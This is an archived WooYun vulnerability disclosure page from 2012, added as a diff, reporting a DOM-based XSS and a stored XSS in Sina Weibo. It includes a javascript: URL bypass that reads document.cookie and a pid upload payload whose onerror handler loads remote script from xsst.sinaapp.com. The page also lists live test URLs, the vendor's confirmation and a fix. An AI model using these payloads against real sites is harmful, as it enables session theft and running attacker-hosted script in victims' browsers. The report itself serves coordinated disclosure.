@@ -1,0 +1,339 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博主站XSS + 微博某官方应用存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博主站XSS + 微博某官方应用存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-03 17:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-23：	细节向普通白帽子公开<br/>
+									2012-07-03：	细节向实习白帽子公开<br/>
+									2012-07-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">单独一个反射型的不好意思发，然后就跑去找啊找。。凑个存储型的一起发。。<br />
+<br />
+这2天打开我们这边的电信好像出了问题， 打开乌云特别慢！！ 我提交这个。。弄了3，4次，都卡住了。  <br />
+<br />
+无奈之下。切换教育网。。。。。<br />
+<br />
+BTW，新浪的礼物着实不错，不管价值多少，数量还是很可观的，俺转手送妹子也可以多分几个妹子～～ 。 *^_^* <br />
+<br />
+1. 新浪微博某处代码过滤不严，导致在IE下可以触发XSS攻击。<br />
+2. 微博某应用某处输入输出未过滤，导致存储型XSS。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 第一个问题，网易微博和你们存在一样的问题，有问题的代码段也是一模一样。<br />
+<br />
+<br />
+<br />
+以下是有问题的JS代码，该代码在几乎每个页面下均存在。 <br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+(function() {<br />
+   var url = location.toString();<br />
+   var index = url.indexOf(&#039;#!&#039;);<br />
+   if (index != -1) {<br />
+      location.replace(url.substr(index + 2).replace(/\:/g, &#039;&#039;));<br />
+   }<br />
+})();<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+虽然代码过滤了冒号，但是在IE下（测试时为win7+ IE9），我们可以通过以下方式绕过。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.weibo.com/gainover#!javascript&amp;#x3A;alert(document.cookie)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+-----------------------------------------------<br />
+<br />
+<br />
+<br />
+2. 微博相册功能存储型XSS<br />
+<br />
+<br />
+<br />
+A. 进入相册之后，还是先上传了个图片，试了下图片的描述，标签等位置，均被过滤了。。 <br />
+<br />
+<br />
+<br />
+B. 回到相册首页（http://photo.weibo.com/{你的ID}/photos）打开调试工具，查看刚上传的图片。 会看到以下内容。<br />
+<br />
+<br />
+<br />
+[图片_2_1]<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/031725542708ba580b6560e4e955c656995fac96.jpg" target="_blank"><img src="../images/031725542708ba580b6560e4e955c656995fac96.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+C. 可以看到图_2_1所示，里面有一个pid，不难推测是picture_id之意。 那么这个pid，是服务器端所分配，还是我们可以自定义输入呢？<br />
+<br />
+<br />
+<br />
+D. 带着这个疑问，我们再回到上传功能，抓包， 见图_2_2<br />
+<br />
+<br />
+<br />
+[图片_2_2]<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/031726099ab8c5bef5744aabb1ca2d6f6b7cd49e.jpg" target="_blank"><img src="../images/031726099ab8c5bef5744aabb1ca2d6f6b7cd49e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+E. 可以发现，这里貌似可以自己写入pid，就是不知道新浪做了过滤没有，当然，每次这个时候，我都是心里祈祷：“没过滤，没过滤，没过滤。。。。” <br />
+<br />
+<br />
+<br />
+在我强大念力的支持下， 新浪的防线崩溃了， <br />
+<br />
+<br />
+<br />
+我们修改pid为<br />
+<br />
+<br />
+<br />
+</p><pre><code>1dtl0mv6r0bj&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+果然没过滤。侧漏啦～～ <br />
+<br />
+<br />
+<br />
+[图片_2_3]<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0317262889b0cc4a7ffd4dcd29b5c991e177272e.jpg" target="_blank"><img src="../images/0317262889b0cc4a7ffd4dcd29b5c991e177272e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+F. 但是比较意外的是，再打开chrome调试工具的时候，我们发现，我们原来最开始看到的那个pid的位置并没有改变，而我们的代码，是插到了&lt;img src=&quot;http://xxxx/pid{我们的代码}.jpg&quot;&gt; ，见图2_4。<br />
+<br />
+<br />
+<br />
+[图片_2_4]<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/03172708862e38afb4e8fe94038c4cfd2fe1bfb6.jpg" target="_blank"><img src="../images/03172708862e38afb4e8fe94038c4cfd2fe1bfb6.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+到这里，才发现自己眼瞎了。最初看到的那个 pid 和我们POST的pid其实根本不是一个东西。。。 list-data里的pid是纯数字，我们post的pid是数字+字母组合！！<br />
+<br />
+<br />
+<br />
+G. 歪打正着了。。。歪打正着了。。  <br />
+<br />
+<br />
+<br />
+H. 看岔了也没什么，反正我们发现一处没过滤的位置，那就好办啦，我们开始构造我们的代码。<br />
+<br />
+<br />
+<br />
+修改pid为以下内容。然后提交。 由于pid长度有大约75的限制，故事也jQuery来调用外部JS<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://photo.weibo.com/upload/photo<br />
+<br />
+POSTDATA<br />
+album_id	3452856527901069<br />
+pid	1dtl0mv6r0bj&quot; onerror=&quot;jQuery.getScript(&#039;//xsst.sinaapp.com/m.js&#039;)&quot;&gt;&lt;b/</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+G. 效果见漏洞截图证明，<br />
+<br />
+<br />
+<br />
+以下是被插入的代码<br />
+<br />
+<br />
+<br />
+[图片_2_5]<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/03172723963bca4c4c5f4d5f0f1ccd5b4e6fab99.jpg" target="_blank"><img src="../images/03172723963bca4c4c5f4d5f0f1ccd5b4e6fab99.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+或打开以下测试页面！<br />
+<br />
+<br />
+<br />
+http://photo.weibo.com/2818517120/albums/detail/album_id/3452856527901069<br />
+<br />
+http://photo.weibo.com/2818517120/photos/detail/photo_id/3452864928806857 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">第一个XSS证明：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/031725264c82bed00119c07c68a01e5da87f0c4c.jpg" target="_blank"><img src="../images/031725264c82bed00119c07c68a01e5da87f0c4c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+第二个XSS证明：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/03172539043087d2e74f905fe808cc476b6f1a36.jpg" target="_blank"><img src="../images/03172539043087d2e74f905fe808cc476b6f1a36.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对 http://photo.weibo.com/upload/photo 的 pid 进行过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07846" title="新浪微博主站XSS + 微博某官方应用存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-06-03 18:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">第一个是DOM型，第二个存储型。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7846";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
